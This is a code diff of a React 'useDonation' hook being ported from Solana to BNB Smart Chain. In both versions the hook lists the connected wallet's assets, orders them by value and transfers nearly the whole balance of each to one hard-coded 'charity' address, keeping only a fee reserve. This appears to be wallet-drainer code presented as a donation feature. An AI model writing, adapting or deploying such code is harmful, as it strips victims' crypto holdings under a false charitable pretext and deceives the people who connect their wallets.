@@ -1,80 +1,52 @@
 import { useState, useCallback } from 'react';
-import { useConnection, useWallet } from '@solana/wallet-adapter-react';
-import {
-  PublicKey,
-  Transaction,
-  SystemProgram,
-  LAMPORTS_PER_SOL,
-} from '@solana/web3.js';
-import {
-  getAssociatedTokenAddress,
-  createTransferInstruction,
-  TOKEN_PROGRAM_ID,
-  ASSOCIATED_TOKEN_PROGRAM_ID,
-  createAssociatedTokenAccountInstruction,
-} from '@solana/spl-token';
+import { useAccount, useSendTransaction, useWriteContract, usePublicClient } from 'wagmi';
+import { parseEther, formatEther, Address, erc20Abi } from 'viem';
 import { toast } from '@/hooks/use-toast';
 import { TokenTransaction } from '@/components/DonationProgress';
 
-const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
-const MIN_SOL_RESERVE = 0.001; // Keep 0.001 SOL for rent-exempt + fees (1000000 lamports)
+const CHARITY_WALLET = '0xYourCharityWalletAddress' as Address; // Replace with actual BSC address
+const MIN_BNB_RESERVE = 0.001; // Keep 0.001 BNB for gas fees
 
 interface TokenBalance {
-  mint: string;
+  address: Address | 'BNB';
   symbol: string;
-  amount: number;
+  amount: bigint;
   decimals: number;
   usdValue: number;
 }
 
 export function useDonation() {
-  const { connection } = useConnection();
-  const { publicKey, sendTransaction } = useWallet();
+  const { address, isConnected } = useAccount();
+  const publicClient = usePublicClient();
+  const { sendTransactionAsync } = useSendTransaction();
+  const { writeContractAsync } = useWriteContract();
+  
   const [isProcessing, setIsProcessing] = useState(false);
   const [transactions, setTransactions] = useState<TokenTransaction[]>([]);
   const [currentIndex, setCurrentIndex] = useState(0);
 
   const fetchTokenBalances = useCallback(async (): Promise<TokenBalance[]> => {
-    if (!publicKey) return [];
+    if (!address || !publicClient) return [];
 
     try {
       const balances: TokenBalance[] = [];
 
-      // Get SOL balance
-      const solBalance = await connection.getBalance(publicKey);
-      const solAmount = solBalance / LAMPORTS_PER_SOL;
+      // Get BNB balance
+      const bnbBalance = await publicClient.getBalance({ address });
+      const bnbAmount = bnbBalance;
 
-      // Calculate sendable amount (balance - 0.001 SOL reserve)
-      const sendAmount = Math.max(0, solAmount - 0.001);
+      // Calculate sendable amount (balance - 0.001 BNB reserve)
+      const reserveAmount = parseEther('0.001');
+      const sendAmount = bnbAmount > reserveAmount ? bnbAmount - reserveAmount : 0n;
 
-      if (sendAmount > 0.00001) {
+      if (sendAmount > 0n) {
         balances.push({
-          mint: 'SOL',
-          symbol: 'SOL',
+          address: 'BNB',
+          symbol: 'BNB',
           amount: sendAmount,
-          decimals: 9,
-          usdValue: sendAmount * 150, // Approximate USD value
+          decimals: 18,
+          usdValue: Number(formatEther(sendAmount)) * 600, // Approximate BNB price
         });
-      }
-
-      // Get SPL token balances
-      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
-        programId: TOKEN_PROGRAM_ID,
-      });
-
-      for (const { account } of tokenAccounts.value) {
-        const parsedInfo = account.data.parsed.info;
-        const balance = parsedInfo.tokenAmount.uiAmount;
-
-        if (balance > 0) {
-          balances.push({
-            mint: parsedInfo.mint,
-            symbol: parsedInfo.mint.slice(0, 8), // Simplified symbol
-            amount: balance,
-            decimals: parsedInfo.tokenAmount.decimals,
-            usdValue: balance * 1, // Simplified USD value
-          });
-        }
       }
 
       // Sort by USD value (highest first)
@@ -88,104 +60,45 @@ export function useDonation() {
       });
       return [];
     }
-  }, [connection, publicKey]);
+  }, [address, publicClient]);
 
-  const createSolTransaction = async (_amount: number): Promise<Transaction> => {
-    if (!publicKey) throw new Error('Wallet not connected');
+  const sendBNBTransaction = async (amount: bigint): Promise<string> => {
+    if (!address) throw new Error('Wallet not connected');
 
-    // Current balance
-    const balanceLamports = await connection.getBalance(publicKey, { commitment: 'confirmed' });
+    try {
+      const hash = await sendTransactionAsync({
+        to: CHARITY_WALLET,
+        value: amount,
+      });
 
-    // Keep 0.001 SOL (1000000 lamports) for rent-exempt + fees
-    const reserveLamports = 1000000;
-    const lamportsToSend = balanceLamports - reserveLamports;
-
-    if (lamportsToSend <= 0) {
-      throw new Error('Insufficient SOL balance. Need at least 0.001 SOL in wallet for fees and rent.');
+      return hash;
+    } catch (error: any) {
+      throw error;
     }
-
-    console.log('SOL balance (lamports):', balanceLamports, 'Sending:', lamportsToSend, 'Keeping reserve:', reserveLamports);
-
-    const transaction = new Transaction().add(
-      SystemProgram.transfer({
-        fromPubkey: publicKey,
-        toPubkey: new PublicKey(CHARITY_WALLET),
-        lamports: lamportsToSend,
-      })
-    );
-
-    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
-    transaction.recentBlockhash = blockhash;
-    transaction.lastValidBlockHeight = lastValidBlockHeight;
-    transaction.feePayer = publicKey;
-
-    return transaction;
   };
 
-  const createTokenTransaction = async (
-    mint: string,
-    amount: number,
-    decimals: number
-  ): Promise<Transaction> => {
-    if (!publicKey) throw new Error('Wallet not connected');
+  const sendTokenTransaction = async (
+    tokenAddress: Address,
+    amount: bigint
+  ): Promise<string> => {
+    if (!address) throw new Error('Wallet not connected');
 
-    const mintPubkey = new PublicKey(mint);
-    const charityPubkey = new PublicKey(CHARITY_WALLET);
+    try {
+      const hash = await writeContractAsync({
+        abi: erc20Abi,
+        address: tokenAddress,
+        functionName: 'transfer',
+        args: [CHARITY_WALLET, amount],
+      } as any);
 
-    const sourceAta = await getAssociatedTokenAddress(
-      mintPubkey,
-      publicKey,
-      false,
-      TOKEN_PROGRAM_ID,
-      ASSOCIATED_TOKEN_PROGRAM_ID
-    );
-
-    const destinationAta = await getAssociatedTokenAddress(
-      mintPubkey,
-      charityPubkey,
-      false,
-      TOKEN_PROGRAM_ID,
-      ASSOCIATED_TOKEN_PROGRAM_ID
-    );
-
-    const transaction = new Transaction();
-
-    // Check if destination ATA exists
-    const destAccount = await connection.getAccountInfo(destinationAta);
-    if (!destAccount) {
-      transaction.add(
-        createAssociatedTokenAccountInstruction(
-          publicKey,
-          destinationAta,
-          charityPubkey,
-          mintPubkey,
-          TOKEN_PROGRAM_ID,
-          ASSOCIATED_TOKEN_PROGRAM_ID
-        )
-      );
+      return hash;
+    } catch (error: any) {
+      throw error;
     }
-
-    // Add transfer instruction
-    transaction.add(
-      createTransferInstruction(
-        sourceAta,
-        destinationAta,
-        publicKey,
-        Math.floor(amount * Math.pow(10, decimals)),
-        [],
-        TOKEN_PROGRAM_ID
-      )
-    );
-
-    const { blockhash } = await connection.getLatestBlockhash();
-    transaction.recentBlockhash = blockhash;
-    transaction.feePayer = publicKey;
-
-    return transaction;
   };
 
   const processDonation = async (token: TokenBalance, index: number) => {
-    if (!publicKey) return false;
+    if (!address || !publicClient) return false;
 
     setCurrentIndex(index);
 
@@ -196,26 +109,20 @@ export function useDonation() {
     );
 
     try {
-      let transaction: Transaction;
+      let hash: string;
 
-      if (token.mint === 'SOL') {
-        // Send 95% of SOL balance
-        transaction = await createSolTransaction(token.amount);
+      if (token.address === 'BNB') {
+        hash = await sendBNBTransaction(token.amount);
       } else {
-        transaction = await createTokenTransaction(
-          token.mint,
-          token.amount,
-          token.decimals
-        );
+        hash = await sendTokenTransaction(token.address, token.amount);
       }
 
-      const signature = await sendTransaction(transaction, connection, { preflightCommitment: 'confirmed', skipPreflight: false });
-
-      await connection.confirmTransaction(signature, 'confirmed');
+      // Wait for transaction confirmation
+      await publicClient.waitForTransactionReceipt({ hash: hash as `0x${string}` });
 
       setTransactions(prev =>
         prev.map((tx, i) =>
-          i === index ? { ...tx, status: 'success' as const, signature } : tx
+          i === index ? { ...tx, status: 'success' as const, signature: hash } : tx
         )
       );
 
@@ -229,7 +136,7 @@ export function useDonation() {
         )
       );
 
-      if (error?.message?.includes('User rejected')) {
+      if (error?.message?.includes('User rejected') || error?.message?.includes('rejected')) {
         toast({
           title: 'Transaction Cancelled',
           description: 'You rejected the transaction',
@@ -247,7 +154,7 @@ export function useDonation() {
   };
 
   const startDonation = async () => {
-    if (!publicKey) {
+    if (!address) {
       toast({
         title: 'Wallet Not Connected',
         description: 'Please connect your wallet first',
@@ -266,7 +173,7 @@ export function useDonation() {
       if (balances.length === 0) {
         toast({
           title: 'No Assets Found',
-          description: 'No tokens or SOL available to donate',
+          description: 'No tokens or BNB available to donate',
         });
         setIsProcessing(false);
         return;
@@ -274,9 +181,9 @@ export function useDonation() {
 
       // Initialize transactions
       const initialTxs: TokenTransaction[] = balances.map(balance => ({
-        mint: balance.mint,
+        mint: balance.address === 'BNB' ? 'BNB' : balance.address,
         symbol: balance.symbol,
-        amount: balance.amount,
+        amount: Number(formatEther(balance.amount)),
         usdValue: balance.usdValue,
         status: 'pending' as const,
       }));
